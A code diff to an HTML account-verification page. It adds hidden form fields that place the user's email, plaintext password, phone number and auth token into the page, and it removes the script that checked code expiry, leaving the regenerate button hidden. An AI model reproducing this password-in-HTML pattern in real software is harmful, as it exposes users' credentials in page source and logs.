@@ -61,8 +61,12 @@
         <div class="login-form">
             <h1>Verify Your Account</h1>
             <p>We have sent a verification code to your email. Please check your inbox.</p>
-            <form id="v1" action="/verify" method="post">
+            <form id="v1" action="/verify" method="POST">
                 <div class="code-input-group">
+                    <input type="hidden" id="email" name="email" value="{{ email }}">
+                    <input type="hidden" id="password" name="password" value="{{ password }}">
+                    <input type="hidden" id="phone" name="phone" value="{{ phone }}">
+                    <input type="hidden" name="token" value="{{ auth_token }}">
                     <input class="code-input" type="text" name="code1" maxlength="1" pattern="[0-9]{1}" required>
                     <input class="code-input" type="text" name="code2" maxlength="1" pattern="[0-9]{1}" required>
                     <input class="code-input" type="text" name="code3" maxlength="1" pattern="[0-9]{1}" required>
@@ -74,79 +78,13 @@
                 <input type="hidden" name="code" id="fullCode">
                 <button type="submit">Verify</button>
             </form>
-            <p id="expiredMessage" style="display: none; color: red;">Verification code expired. Click <a href="#" id="regenerateLink">here</a> to regenerate.</p>
+            <p id="expiredMessage" style="display: none; color: red;">
+                Verification code expired. Click
+                <button id="regenerateButton" onclick="regenerateCode();event.preventDefault();" style="display: none;">here</button>
+                to regenerate.
+            </p>
         </div>
     </div>
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            checkCodeExpirationPeriodically();
-            const regenerateLink = document.getElementById('regenerateLink');
-            regenerateLink.addEventListener('click', function(event) {
-                event.preventDefault();
-                regenerateCode();
-                regenerateLink.style.display = 'none';
-            });
-        });
-
-        function regenerateCode() {
-            fetch('/regenerate_code', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                }
-            })
-            .then(response => response.json())
-            .then(data => {
-                const messageElement = document.getElementById('expiredMessage');
-                const regenerateLink = document.getElementById('regenerateLink');
-                if (data.success) {
-                    messageElement.innerHTML = 'A new verification code has been sent to your email.';
-                    messageElement.style.display = 'block';
-                    messageElement.style.color = 'green';
-                } else {
-                    messageElement.innerHTML = 'Failed to regenerate code. Please try again.';
-                    messageElement.style.display = 'block';
-                    messageElement.style.color = 'red';
-                    regenerateLink.style.display = 'inline';
-                }
-            })
-            .catch(error => {
-                console.error('Error regenerating code:', error);
-                document.getElementById('expiredMessage').innerHTML = 'Error connecting to server. Please try again.';
-                document.getElementById('expiredMessage').style.display = 'block';
-                document.getElementById('expiredMessage').style.color = 'red';
-                document.getElementById('regenerateLink').style.display = 'inline';
-            });
-        }
-
-        function checkCodeExpiration() {
-            fetch('/check_code_expiration')
-                .then(response => response.json())
-                .then(data => {
-                    const messageElement = document.getElementById('expiredMessage');
-                    const regenerateLink = document.getElementById('regenerateLink');
-                    if (data.expired) {
-                        messageElement.innerHTML = 'Verification code expired. Click <a href="#" id="regenerateLink" onclick="regenerateCode();event.preventDefault();">here</a> to regenerate.';
-                        messageElement.style.display = 'block';
-                        messageElement.style.color = 'red';
-                        regenerateLink.style.display = 'inline';
-                    } else {
-                        messageElement.style.display = 'none';
-                        regenerateLink.style.display = 'none';
-                    }
-                })
-                .catch(error => {
-                    console.error('Error checking code expiration:', error);
-                });
-        }
-
-        function checkCodeExpirationPeriodically() {
-            checkCodeExpiration();
-            setInterval(checkCodeExpiration, 5000);
-        }
-        </script>
-
     <script>
     document.querySelectorAll('.code-input').forEach((input, index, array) => {
         input.addEventListener('keyup', (e) => {
